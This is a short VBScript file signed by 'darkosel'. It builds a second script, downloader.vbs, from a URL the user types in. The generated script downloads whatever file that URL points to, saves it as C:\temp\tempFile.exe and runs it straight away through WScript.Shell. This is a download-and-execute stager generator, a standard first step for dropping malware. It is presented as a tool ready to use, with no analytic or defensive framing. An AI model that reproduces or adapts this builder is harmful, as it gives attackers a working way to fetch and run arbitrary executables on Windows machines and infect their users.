'coded by darkosel     ..... 2025
Dim downloadLink, fso, downloaderScript, fileName


downloadLink = InputBox("Enter the direct download link:", "Direct Download Link")

If downloadLink <> "" Then
    
    Set fso = CreateObject("Scripting.FileSystemObject")

    downloaderScript = "Set objHTTP = CreateObject(""MSXML2.ServerXMLHTTP"")" & vbCrLf
    downloaderScript = downloaderScript & "objHTTP.Open ""GET"", """ & downloadLink & """, False" & vbCrLf
    downloaderScript = downloaderScript & "objHTTP.Send" & vbCrLf
    downloaderScript = downloaderScript & "If objHTTP.Status = 200 Then" & vbCrLf
    downloaderScript = downloaderScript & "    Set objStream = CreateObject(""ADODB.Stream"")" & vbCrLf
    downloaderScript = downloaderScript & "    objStream.Type = 1 ' Binary" & vbCrLf
    downloaderScript = downloaderScript & "    objStream.Open" & vbCrLf
    downloaderScript = downloaderScript & "    objStream.Write objHTTP.ResponseBody" & vbCrLf
    downloaderScript = downloaderScript & "    objStream.Position = 0" & vbCrLf
    downloaderScript = downloaderScript & "    Set objFile = CreateObject(""WScript.Shell"")" & vbCrLf
    downloaderScript = downloaderScript & "    objStream.SaveToFile ""C:\temp\tempFile.exe"", 2" & vbCrLf ' Change the path and name as needed
    downloaderScript = downloaderScript & "    objStream.Close" & vbCrLf
    downloaderScript = downloaderScript & "    objFile.Run ""C:\temp\tempFile.exe""" & vbCrLf ' Execute the downloaded file
    downloaderScript = downloaderScript & "Else" & vbCrLf
    downloaderScript = downloaderScript & "    MsgBox ""Download failed. Status: "" & objHTTP.Status" & vbCrLf
    downloaderScript = downloaderScript & "End If" & vbCrLf

 
    Set fileName = fso.CreateTextFile("downloader.vbs", True)
    fileName.WriteLine(downloaderScript)
    fileName.Close

    MsgBox "Downloader script created as downloader.vbs"
Else
    MsgBox "No link entered."
End If
